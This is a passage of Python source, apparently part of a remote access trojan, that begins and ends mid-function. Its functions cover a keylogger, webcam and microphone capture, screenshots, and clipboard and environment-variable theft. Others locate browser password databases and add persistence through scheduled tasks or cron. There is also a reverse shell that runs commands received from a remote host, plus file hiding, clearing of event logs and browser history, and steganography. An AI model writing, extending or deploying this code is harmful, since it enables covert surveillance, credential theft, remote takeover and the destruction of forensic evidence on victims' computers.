            return "success:terminated"
        else:
            mining_process = None
            return "info:already_stopped"
    except Exception as e:
        logger.error(f"Error stopping mining: {e}")
        return f"error:{str(e)}"

# ========== NEW FEATURE FUNCTIONS ==========

def take_screenshot():
    """Take a screenshot and return as base64"""
    try:
        if not SCREENSHOT_AVAILABLE:
            return "error:screenshot_library_not_available"
        img = ImageGrab.grab()
        import io
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        img_data = buffer.getvalue()
        return base64.b64encode(img_data).decode('utf-8')
    except Exception as e:
        logger.error(f"Error taking screenshot: {e}")
        return f"error:{str(e)}"

def list_processes():
    """List all running processes"""
    try:
        if not PSUTIL_AVAILABLE:
            return json.dumps({"error": "psutil not available"})
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return json.dumps(processes)
    except Exception as e:
        logger.error(f"Error listing processes: {e}")
        return json.dumps({"error": str(e)})

def kill_process(pid):
    """Kill a process by PID"""
    try:
        if not PSUTIL_AVAILABLE:
            return "error:psutil_not_available"
        proc = psutil.Process(int(pid))
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except psutil.TimeoutExpired:
            proc.kill()
        return f"success:process_{pid}_terminated"
    except psutil.NoSuchProcess:
        return f"error:process_{pid}_not_found"
    except psutil.AccessDenied:
        return f"error:access_denied_for_process_{pid}"
    except Exception as e:
        return f"error:{str(e)}"

def list_files(path):
    """List files in a directory"""
    try:
        if not path:
            path = os.getcwd()
        path = os.path.expanduser(path)
        if not os.path.exists(path):
            return json.dumps({"error": "path_not_found"})
        
        files = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            try:
                stat_info = os.stat(item_path)
                files.append({
                    "name": item,
                    "path": item_path,
                    "size": stat_info.st_size,
                    "is_dir": os.path.isdir(item_path),
                    "modified": datetime.fromtimestamp(stat_info.st_mtime).isoformat()
                })
            except:
                pass
        return json.dumps(files)
    except Exception as e:
        logger.error(f"Error listing files: {e}")
        return json.dumps({"error": str(e)})

def read_file(file_path):
    """Read a file and return as base64"""
    try:
        file_path = os.path.expanduser(file_path)
        if not os.path.exists(file_path):
            return "error:file_not_found"
        if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB limit
            return "error:file_too_large"
        with open(file_path, 'rb') as f:
            data = f.read()
        return base64.b64encode(data).decode('utf-8')
    except Exception as e:
        logger.error(f"Error reading file: {e}")
        return f"error:{str(e)}"

def write_file(file_path, file_data):
    """Write a file from base64 data"""
    try:
        file_path = os.path.expanduser(file_path)
        # Create directory if needed
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        data = base64.b64decode(file_data)
        with open(file_path, 'wb') as f:
            f.write(data)
        return f"success:file_written:{file_path}"
    except Exception as e:
        logger.error(f"Error writing file: {e}")
        return f"error:{str(e)}"

def delete_file(file_path):
    """Delete a file or directory"""
    try:
        file_path = os.path.expanduser(file_path)
        if not os.path.exists(file_path):
            return "error:file_not_found"
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
            return f"success:directory_deleted:{file_path}"
        else:
            os.remove(file_path)
            return f"success:file_deleted:{file_path}"
    except Exception as e:
        logger.error(f"Error deleting file: {e}")
        return f"error:{str(e)}"

def get_clipboard():
    """Get clipboard contents"""
    try:
        if not CLIPBOARD_AVAILABLE:
            return "error:clipboard_library_not_available"
        return pyperclip.paste()
    except Exception as e:
        logger.error(f"Error getting clipboard: {e}")
        return f"error:{str(e)}"

def set_clipboard(text):
    """Set clipboard contents"""
    try:
        if not CLIPBOARD_AVAILABLE:
            return "error:clipboard_library_not_available"
        pyperclip.copy(text)
        return "success:clipboard_set"
    except Exception as e:
        logger.error(f"Error setting clipboard: {e}")
        return f"error:{str(e)}"

def get_network_connections():
    """Get network connections"""
    try:
        if not PSUTIL_AVAILABLE:
            return json.dumps({"error": "psutil not available"})
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            try:
                connections.append({
                    "fd": conn.fd,
                    "family": str(conn.family),
                    "type": str(conn.type),
                    "laddr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                    "raddr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    "status": conn.status,
                    "pid": conn.pid
                })
            except:
                pass
        return json.dumps(connections)
    except Exception as e:
        logger.error(f"Error getting network connections: {e}")
        return json.dumps({"error": str(e)})

def get_installed_software():
    """Get installed software list"""
    try:
        system = platform.system()
        software = []
        
        if system == 'Windows':
            # Windows registry method
            if WINDOWS_REG_AVAILABLE:
                try:
                    key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
                    i = 0
                    while True:
                        try:
                            subkey_name = reg.EnumKey(key, i)
                            subkey = reg.OpenKey(key, subkey_name)
                            try:
                                name = reg.QueryValueEx(subkey, "DisplayName")[0]
                                software.append({"name": name, "source": "registry"})
                            except:
                                pass
                            reg.CloseKey(subkey)
                            i += 1
                        except OSError:
                            break
                    reg.CloseKey(key)
                except:
                    pass
        elif system == 'Linux':
            # Linux package managers
            for cmd in ['dpkg -l', 'rpm -qa', 'pacman -Q']:
                try:
                    result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n')[2:]:  # Skip headers
                            if line.strip():
                                parts = line.split()
                                if parts:
                                    software.append({"name": parts[1] if len(parts) > 1 else parts[0], "source": cmd.split()[0]})
                        break
                except:
                    continue
        elif system == 'Darwin':  # macOS
            try:
                result = subprocess.run(['system_profiler', 'SPApplicationsDataType'], 
                                       capture_output=True, text=True, timeout=10)
                # Parse output (simplified)
                for line in result.stdout.split('\n'):
                    if ':' in line and not line.startswith(' '):
                        software.append({"name": line.split(':')[0].strip(), "source": "system_profiler"})
            except:
                pass
        
        return json.dumps(software[:100])  # Limit to 100 entries
    except Exception as e:
        logger.error(f"Error getting installed software: {e}")
        return json.dumps({"error": str(e)})

def get_environment_variables():
    """Get environment variables"""
    try:
        return json.dumps(dict(os.environ))
    except Exception as e:
        logger.error(f"Error getting environment variables: {e}")
        return json.dumps({"error": str(e)})

def get_system_logs(count=50):
    """Get system logs (platform-specific)"""
    try:
        system = platform.system()
        logs = []
        
        if system == 'Windows':
            # Windows Event Log (simplified - would need win32evtlog)
            logs.append({"message": "Windows event log access requires win32evtlog module"})
        elif system == 'Linux':
            # Linux syslog
            try:
                result = subprocess.run(['tail', '-n', str(count), '/var/log/syslog'],
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if line.strip():
                            logs.append({"message": line})
            except:
                pass
        elif system == 'Darwin':  # macOS
            try:
                result = subprocess.run(['log', 'show', '--last', str(count), '--predicate', 'eventMessage != ""'],
                                       capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n')[:count]:
                        if line.strip():
                            logs.append({"message": line})
            except:
                pass
        
        return json.dumps(logs)
    except Exception as e:
        logger.error(f"Error getting system logs: {e}")
        return json.dumps({"error": str(e)})

def get_browser_history():
    """Get browser history (Chrome/Edge/Firefox)"""
    try:
        system = platform.system()
        history = []
        
        # Chrome/Edge paths
        if system == 'Windows':
            chrome_paths = [
                os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History'),
                os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History'),
            ]
        elif system == 'Linux':
            chrome_paths = [
                os.path.expanduser('~/.config/google-chrome/Default/History'),
                os.path.expanduser('~/.config/chromium/Default/History'),
            ]
        elif system == 'Darwin':
            chrome_paths = [
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History'),
            ]
        else:
            chrome_paths = []
        
        # Note: Browser history files are SQLite databases
        # This is a simplified version - full implementation would require sqlite3
        for path in chrome_paths:
            if os.path.exists(path):
                history.append({"browser": "Chrome/Edge", "path": path, "note": "SQLite database - requires parsing"})
        
        return json.dumps(history)
    except Exception as e:
        logger.error(f"Error getting browser history: {e}")
        return json.dumps({"error": str(e)})

def get_real_time_stats():
    """Get real-time system statistics"""
    try:
        if not PSUTIL_AVAILABLE:
            return json.dumps({"error": "psutil not available"})
        
        stats = {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "cpu_count": psutil.cpu_count(),
            "memory": {
                "total": psutil.virtual_memory().total,
                "available": psutil.virtual_memory().available,
                "percent": psutil.virtual_memory().percent,
                "used": psutil.virtual_memory().used
            },
            "disk": {}
        }
        
        # Disk stats
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                stats["disk"][partition.mountpoint] = {
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent
                }
            except:
                pass
        
        return json.dumps(stats)
    except Exception as e:
        logger.error(f"Error getting real-time stats: {e}")
        return json.dumps({"error": str(e)})

def scan_network(subnet=None):
    """Scan local network"""
    try:
        if not subnet:
            # Get local network
            ip = get_local_ip()
            subnet = '.'.join(ip.split('.')[:-1]) + '.0/24'
        
        # Simple ping scan
        hosts = []
        base_ip = subnet.split('/')[0]
        base = '.'.join(base_ip.split('.')[:-1])
        
        for i in range(1, 255):
            host = f"{base}.{i}"
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', host] if platform.system() != 'Windows' 
                                      else ['ping', '-n', '1', '-w', '1000', host],
                                      capture_output=True, timeout=2)
                if result.returncode == 0:
                    hosts.append({"ip": host, "status": "up"})
            except:
                pass
        
        return json.dumps(hosts)
    except Exception as e:
        logger.error(f"Error scanning network: {e}")
        return json.dumps({"error": str(e)})

# ========== ADVANCED FEATURE FUNCTIONS ==========

def start_keylogger():
    """Start keylogging"""
    global keylogger_thread, keylog_buffer
    
    if not KEYLOGGER_AVAILABLE:
        return "error:keylogger_library_not_available"
    
    if keylogger_thread and keylogger_thread.is_alive():
        return "error:keylogger_already_running"
    
    def on_press(key):
        try:
            with keylog_lock:
                timestamp = datetime.now().isoformat()
                key_str = str(key).replace("'", "")
                keylog_buffer.append(f"[{timestamp}] {key_str}")
                # Limit buffer size
                if len(keylog_buffer) > 1000:
                    keylog_buffer = keylog_buffer[-1000:]
        except:
            pass
    
    try:
        from pynput import keyboard
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        keylogger_thread = listener
        logger.info("Keylogger started")
        return "success:keylogger_started"
    except Exception as e:
        logger.error(f"Error starting keylogger: {e}")
        return f"error:{str(e)}"

def stop_keylogger():
    """Stop keylogging"""
    global keylogger_thread, keylog_buffer
    
    try:
        if keylogger_thread:
            keylogger_thread.stop()
            keylogger_thread = None
        logger.info("Keylogger stopped")
        return "success:keylogger_stopped"
    except Exception as e:
        logger.error(f"Error stopping keylogger: {e}")
        return f"error:{str(e)}"

def get_keylog_data():
    """Get keylog data"""
    global keylog_buffer
    try:
        with keylog_lock:
            data = keylog_buffer.copy()
            keylog_buffer = []  # Clear buffer
        return json.dumps(data)
    except Exception as e:
        logger.error(f"Error getting keylog data: {e}")
        return json.dumps({"error": str(e)})

def capture_webcam(duration=5):
    """Capture webcam video"""
    if not WEBCAM_AVAILABLE:
        return "error:webcam_library_not_available"
    
    try:
        import cv2
        import numpy as np
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "error:webcam_not_available"
        
        frames = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if ret:
                # Encode frame as JPEG
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                frames.append(base64.b64encode(buffer).decode('utf-8'))
            time.sleep(0.1)  # ~10 FPS
        
        cap.release()
        return json.dumps({"frames": frames, "count": len(frames)})
    except Exception as e:
        logger.error(f"Error capturing webcam: {e}")
        return f"error:{str(e)}"

def record_audio(duration=5):
    """Record audio"""
    if not AUDIO_AVAILABLE:
        return "error:audio_library_not_available"
    
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                           input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        # Convert to base64
        audio_data = b''.join(frames)
        return base64.b64encode(audio_data).decode('utf-8')
    except Exception as e:
        logger.error(f"Error recording audio: {e}")
        return f"error:{str(e)}"

def read_registry_key(key_path, value_name=None):
    """Read Windows registry key"""
    if not WINDOWS_REG_AVAILABLE:
        return json.dumps({"error": "Windows registry not available"})
    
    try:
        # Parse key path (format: HKEY_CURRENT_USER\\Path\\To\\Key)
        parts = key_path.split('\\', 1)
        if len(parts) != 2:
            return json.dumps({"error": "Invalid registry path format"})
        
        hkey_name = parts[0]
        subkey_path = parts[1]
        
        hkey_map = {
            'HKEY_CURRENT_USER': reg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': reg.HKEY_LOCAL_MACHINE,
            'HKEY_CLASSES_ROOT': reg.HKEY_CLASSES_ROOT,
            'HKEY_USERS': reg.HKEY_USERS
        }
        
        if hkey_name not in hkey_map:
            return json.dumps({"error": "Invalid HKEY name"})
        
        hkey = hkey_map[hkey_name]
        reg_key = reg.OpenKey(hkey, subkey_path)
        
        if value_name:
            value, value_type = reg.QueryValueEx(reg_key, value_name)
            reg.CloseKey(reg_key)
            return json.dumps({"value": str(value), "type": str(value_type)})
        else:
            # List all values
            values = {}
            i = 0
            while True:
                try:
                    name, value, value_type = reg.EnumValue(reg_key, i)
                    values[name] = {"value": str(value), "type": str(value_type)}
                    i += 1
                except OSError:
                    break
            reg.CloseKey(reg_key)
            return json.dumps(values)
    except Exception as e:
        logger.error(f"Error reading registry: {e}")
        return json.dumps({"error": str(e)})

def write_registry_key(key_path, value_name, value, value_type="REG_SZ"):
    """Write Windows registry key"""
    if not WINDOWS_REG_AVAILABLE:
        return "error:windows_registry_not_available"
    
    try:
        parts = key_path.split('\\', 1)
        if len(parts) != 2:
            return "error:invalid_registry_path_format"
        
        hkey_name = parts[0]
        subkey_path = parts[1]
        
        hkey_map = {
            'HKEY_CURRENT_USER': reg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': reg.HKEY_LOCAL_MACHINE,
            'HKEY_CLASSES_ROOT': reg.HKEY_CLASSES_ROOT,
            'HKEY_USERS': reg.HKEY_USERS
        }
        
        if hkey_name not in hkey_map:
            return "error:invalid_hkey_name"
        
        hkey = hkey_map[hkey_name]
        reg_key = reg.OpenKey(hkey, subkey_path, 0, reg.KEY_WRITE)
        
        type_map = {
            'REG_SZ': reg.REG_SZ,
            'REG_DWORD': reg.REG_DWORD,
            'REG_BINARY': reg.REG_BINARY
        }
        
        reg_type = type_map.get(value_type, reg.REG_SZ)
        reg.SetValueEx(reg_key, value_name, 0, reg_type, value)
        reg.CloseKey(reg_key)
        
        return f"success:registry_key_written:{key_path}\\{value_name}"
    except Exception as e:
        logger.error(f"Error writing registry: {e}")
        return f"error:{str(e)}"

def list_services():
    """List system services"""
    try:
        system = platform.system()
        services = []
        
        if system == 'Windows':
            try:
                result = subprocess.run(['sc', 'query', 'type=', 'service', 'state=', 'all'],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    current_service = {}
                    for line in result.stdout.split('\n'):
                        if 'SERVICE_NAME:' in line:
                            if current_service:
                                services.append(current_service)
                            current_service = {'name': line.split(':', 1)[1].strip()}
                        elif ':' in line and current_service:
                            key, val = line.split(':', 1)
                            current_service[key.strip().lower()] = val.strip()
                    if current_service:
                        services.append(current_service)
            except:
                pass
        elif system in ['Linux', 'Darwin']:
            try:
                result = subprocess.run(['systemctl', 'list-units', '--type=service', '--no-pager'],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            parts = line.split()
                            if parts:
                                services.append({'name': parts[0], 'status': parts[3] if len(parts) > 3 else 'unknown'})
            except:
                pass
        
        return json.dumps(services[:100])  # Limit to 100
    except Exception as e:
        logger.error(f"Error listing services: {e}")
        return json.dumps({"error": str(e)})

def control_service(service_name, action):
    """Control a service (start/stop/restart)"""
    try:
        system = platform.system()
        
        if system == 'Windows':
            cmd_map = {
                'start': ['sc', 'start', service_name],
                'stop': ['sc', 'stop', service_name],
                'restart': ['sc', 'stop', service_name]  # Will need to start after
            }
        else:
            cmd_map = {
                'start': ['systemctl', 'start', service_name],
                'stop': ['systemctl', 'stop', service_name],
                'restart': ['systemctl', 'restart', service_name]
            }
        
        if action not in cmd_map:
            return f"error:invalid_action:{action}"
        
        result = subprocess.run(cmd_map[action], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return f"success:service_{action}:{service_name}"
        else:
            return f"error:{result.stderr[:200]}"
    except Exception as e:
        logger.error(f"Error controlling service: {e}")
        return f"error:{str(e)}"

def extract_browser_passwords():
    """Extract saved passwords from browsers"""
    try:
        system = platform.system()
        passwords = []
        
        # Chrome/Edge password database locations
        if system == 'Windows':
            chrome_paths = [
                (os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data'), 'Chrome'),
                (os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'), 'Edge'),
            ]
        elif system == 'Linux':
            chrome_paths = [
                (os.path.expanduser('~/.config/google-chrome/Default/Login Data'), 'Chrome'),
                (os.path.expanduser('~/.config/chromium/Default/Login Data'), 'Chromium'),
            ]
        elif system == 'Darwin':
            chrome_paths = [
                (os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'), 'Chrome'),
            ]
        else:
            chrome_paths = []
        
        for db_path, browser in chrome_paths:
            if os.path.exists(db_path):
                passwords.append({
                    "browser": browser,
                    "database_path": db_path,
                    "note": "SQLite database - requires decryption key from OS keychain"
                })
        
        return json.dumps(passwords)
    except Exception as e:
        logger.error(f"Error extracting browser passwords: {e}")
        return json.dumps({"error": str(e)})

def create_scheduled_task(task_name, command, schedule="daily"):
    """Create a scheduled task"""
    try:
        system = platform.system()
        
        if system == 'Windows':
            # Windows Task Scheduler
            xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{command}</Command>
    </Exec>
  </Actions>
</Task>'''
            xml_file = f"{task_name}.xml"
            with open(xml_file, 'w') as f:
                f.write(xml_content)
            
            result = subprocess.run(['schtasks', '/create', '/tn', task_name, '/xml', xml_file],
                                  capture_output=True, text=True, timeout=10)
            os.remove(xml_file)
            
            if result.returncode == 0:
                return f"success:task_created:{task_name}"
            else:
                return f"error:{result.stderr[:200]}"
        elif system == 'Linux':
            # Linux cron
            cron_entry = f"0 0 * * * {command}\n"
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            new_cron = current_cron + cron_entry
            
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=new_cron)
            
            if process.returncode == 0:
                return f"success:task_created:{task_name}"
            else:
                return "error:cron_failed"
        else:
            return "error:unsupported_platform"
    except Exception as e:
        logger.error(f"Error creating scheduled task: {e}")
        return f"error:{str(e)}"

# ========== ULTRA ADVANCED FEATURES ==========

def start_remote_desktop_stream(interval=1):
    """Start continuous remote desktop streaming"""
    if not SCREENSHOT_AVAILABLE:
        return "error:screenshot_library_not_available"
    
    try:
        frames = []
        for _ in range(10):  # Stream 10 frames
            img = ImageGrab.grab()
            import io
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=50)
            frames.append(base64.b64encode(buffer.getvalue()).decode('utf-8'))
            time.sleep(interval)
        return json.dumps({"frames": frames, "count": len(frames)})
    except Exception as e:
        logger.error(f"Error streaming desktop: {e}")
        return f"error:{str(e)}"

def start_packet_capture(count=100, interface=None):
    """Start packet capture"""
    global packet_capture_active, packet_capture_thread
    
    if not SCAPY_AVAILABLE:
        return "error:scapy_not_available"
    
    if packet_capture_active:
        return "error:packet_capture_already_running"
    
    captured_packets = []
    
    def packet_handler(packet):
        try:
            packet_info = {
                "time": time.time(),
                "summary": packet.summary()
            }
            if IP in packet:
                packet_info["src"] = packet[IP].src
                packet_info["dst"] = packet[IP].dst
                packet_info["proto"] = packet[IP].proto
            if TCP in packet:
                packet_info["sport"] = packet[TCP].sport
                packet_info["dport"] = packet[TCP].dport
            if Raw in packet:
                packet_info["payload"] = packet[Raw].load[:100].hex()  # First 100 bytes
            captured_packets.append(packet_info)
        except:
            pass
    
    try:
        def capture_thread():
            global packet_capture_active
            packet_capture_active = True
            try:
                sniff(count=count, prn=packet_handler, iface=interface, timeout=30)
            except:
                pass
            finally:
                packet_capture_active = False
        
        packet_capture_thread = threading.Thread(target=capture_thread, daemon=True)
        packet_capture_thread.start()
        return f"success:packet_capture_started:capturing_{count}_packets"
    except Exception as e:
        logger.error(f"Error starting packet capture: {e}")
        return f"error:{str(e)}"

def get_captured_packets():
    """Get captured packets"""
    # This would need to be implemented with shared storage
    return json.dumps({"note": "Packet capture data retrieval requires shared storage implementation"})

def start_reverse_shell(host, port):
    """Start reverse shell connection"""
    global reverse_shell_socket
    
    try:
        reverse_shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        reverse_shell_socket.connect((host, int(port)))
        
        def shell_thread():
            while True:
                try:
                    command = reverse_shell_socket.recv(1024).decode('utf-8').strip()
                    if command == "exit":
                        break
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout + result.stderr
                    reverse_shell_socket.send(output.encode('utf-8'))
                except:
                    break
            reverse_shell_socket.close()
        
        threading.Thread(target=shell_thread, daemon=True).start()
        return f"success:reverse_shell_connected:{host}:{port}"
    except Exception as e:
        logger.error(f"Error starting reverse shell: {e}")
        return f"error:{str(e)}"

def search_files(directory, pattern, file_type=None):
    """Search for files matching pattern"""
    try:
        import fnmatch
        import re
        
        matches = []
        directory = os.path.expanduser(directory)
        
        if not os.path.exists(directory):
            return json.dumps({"error": "directory_not_found"})
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                # Check pattern match
                if fnmatch.fnmatch(file, pattern) or re.search(pattern, file, re.IGNORECASE):
                    # Check file type if specified
                    if file_type:
                        if file_type.lower() == "text" and not file.endswith(('.txt', '.log', '.md', '.py', '.js', '.html', '.css')):
                            continue
                        elif file_type.lower() == "image" and not file.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                            continue
                        elif file_type.lower() == "document" and not file.endswith(('.doc', '.docx', '.pdf', '.xls', '.xlsx')):
                            continue
                    
                    try:
                        stat_info = os.stat(file_path)
                        matches.append({
                            "path": file_path,
                            "size": stat_info.st_size,
                            "modified": datetime.fromtimestamp(stat_info.st_mtime).isoformat()
                        })
                    except:
                        pass
                
                if len(matches) >= 100:  # Limit results
                    break
            
            if len(matches) >= 100:
                break
        
        return json.dumps(matches)
    except Exception as e:
        logger.error(f"Error searching files: {e}")
        return json.dumps({"error": str(e)})

def grep_file(file_path, pattern):
    """Search for pattern in file"""
    try:
        import re
        
        file_path = os.path.expanduser(file_path)
        if not os.path.exists(file_path):
            return json.dumps({"error": "file_not_found"})
        
        matches = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                if re.search(pattern, line, re.IGNORECASE):
                    matches.append({
                        "line": line_num,
                        "content": line.strip()[:200]  # Limit line length
                    })
                if len(matches) >= 100:  # Limit results
                    break
        
        return json.dumps(matches)
    except Exception as e:
        logger.error(f"Error grepping file: {e}")
        return json.dumps({"error": str(e)})

def start_file_monitor(paths):
    """Start monitoring file system changes"""
    global file_monitor_active, file_monitor_thread, monitored_paths
    
    if file_monitor_active:
        return "error:file_monitor_already_running"
    
    monitored_paths = paths if isinstance(paths, list) else [paths]
    file_states = {}
    
    def monitor_thread():
        global file_monitor_active
        file_monitor_active = True
        
        while file_monitor_active:
            try:
                for path in monitored_paths:
                    path = os.path.expanduser(path)
                    if os.path.exists(path):
                        if os.path.isfile(path):
                            current_mtime = os.path.getmtime(path)
                            if path in file_states:
                                if current_mtime != file_states[path]:
                                    logger.info(f"File modified: {path}")
                                    file_states[path] = current_mtime
                            else:
                                file_states[path] = current_mtime
                        elif os.path.isdir(path):
                            for root, dirs, files in os.walk(path):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    current_mtime = os.path.getmtime(file_path)
                                    if file_path in file_states:
                                        if current_mtime != file_states[file_path]:
                                            logger.info(f"File modified: {file_path}")
                                    file_states[file_path] = current_mtime
                time.sleep(5)  # Check every 5 seconds
            except:
                pass
    
    file_monitor_thread = threading.Thread(target=monitor_thread, daemon=True)
    file_monitor_thread.start()
    return f"success:file_monitor_started:monitoring_{len(monitored_paths)}_paths"

def stop_file_monitor():
    """Stop file monitoring"""
    global file_monitor_active
    file_monitor_active = False
    return "success:file_monitor_stopped"

def hide_file(file_path):
    """Hide file (platform-specific)"""
    try:
        file_path = os.path.expanduser(file_path)
        system = platform.system()
        
        if system == 'Windows':
            # Windows: Set hidden attribute
            subprocess.run(['attrib', '+H', file_path], capture_output=True)
            return f"success:file_hidden:{file_path}"
        elif system in ['Linux', 'Darwin']:
            # Unix: Rename to start with dot
            if not os.path.basename(file_path).startswith('.'):
                hidden_path = os.path.join(os.path.dirname(file_path), '.' + os.path.basename(file_path))
                os.rename(file_path, hidden_path)
                return f"success:file_hidden:{hidden_path}"
            else:
                return "error:file_already_hidden"
        else:
            return "error:unsupported_platform"
    except Exception as e:
        logger.error(f"Error hiding file: {e}")
        return f"error:{str(e)}"

def clear_logs():
    """Clear system logs (anti-forensics)"""
    try:
        system = platform.system()
        cleared = []
        
        if system == 'Windows':
            # Clear event logs
            try:
                subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True)
                cleared.append("Windows Event Logs")
            except:
                pass
        elif system == 'Linux':
            # Clear syslog
            try:
                subprocess.run(['sudo', 'sh', '-c', '> /var/log/syslog'], capture_output=True)
                cleared.append("syslog")
            except:
                pass
        
        # Clear browser history
        browser_paths = []
        if system == 'Windows':
            browser_paths = [
                os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History'),
                os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History'),
            ]
        elif system == 'Linux':
            browser_paths = [
                os.path.expanduser('~/.config/google-chrome/Default/History'),
            ]
        
        for path in browser_paths:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    cleared.append(f"Browser history: {path}")
                except:
                    pass
        
        return json.dumps({"cleared": cleared})
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        return json.dumps({"error": str(e)})

def embed_steganography(image_path, data):
    """Embed data in image using steganography"""
    if not STEGANOGRAPHY_AVAILABLE:
        return "error:steganography_library_not_available"
    
    try:
        from PIL import Image
        
        img = Image.open(image_path)
        data_bytes = data.encode('utf-8') if isinstance(data, str) else data
        
        # Simple LSB steganography
        pixels = list(img.getdata())
        data_bits = ''.join(format(byte, '08b') for byte in data_bytes)
        data_bits += '1111111111111110'  # End marker
        
        data_index = 0
        new_pixels = []
        for pixel in pixels:
            if data_index < len(data_bits):
                r, g, b = pixel[:3]
                r = (r & 0xFE) | int(data_bits[data_index])
                if data_index + 1 < len(data_bits):
                    g = (g & 0xFE) | int(data_bits[data_index + 1])
                if data_index + 2 < len(data_bits):
                    b = (b & 0xFE) | int(data_bits[data_index + 2])
                data_index += 3
                new_pixels.append((r, g, b) + pixel[3:])
            else:
                new_pixels.append(pixel)
        
        output_path = image_path.replace('.', '_steg.')
        new_img = Image.new(img.mode, img.size)
        new_img.putdata(new_pixels)
        new_img.save(output_path)
        
        return f"success:data_embedded:{output_path}"
    except Exception as e:
        logger.error(f"Error embedding steganography: {e}")
        return f"error:{str(e)}"

def extract_steganography(image_path):
    """Extract data from image"""
    if not STEGANOGRAPHY_AVAILABLE:
        return "error:steganography_library_not_available"
    
    try:
        from PIL import Image
        
        img = Image.open(image_path)
        pixels = list(img.getdata())
        
        data_bits = ''
        for pixel in pixels:
            r, g, b = pixel[:3]
            data_bits += str(r & 1)
            data_bits += str(g & 1)
            data_bits += str(b & 1)
        
        # Find end marker
        end_marker = '1111111111111110'
        if end_marker in data_bits:
            data_bits = data_bits[:data_bits.index(end_marker)]
        
        # Convert bits to bytes
        data_bytes = bytes(int(data_bits[i:i+8], 2) for i in range(0, len(data_bits), 8))
        return data_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        logger.error(f"Error extracting steganography: {e}")
        return f"error:{str(e)}"

def get_detailed_system_info():
    """Get extremely detailed system information"""
    try:
        info = get_system_info()
        base_info = json.loads(info)
        
        # Add more details
        if PSUTIL_AVAILABLE:
            base_info["boot_time"] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
            base_info["users"] = [u.name for u in psutil.users()]
            base_info["disk_io"] = {
                "read_bytes": psutil.disk_io_counters().read_bytes if psutil.disk_io_counters() else 0,
                "write_bytes": psutil.disk_io_counters().write_bytes if psutil.disk_io_counters() else 0
            }
            base_info["network_io"] = {
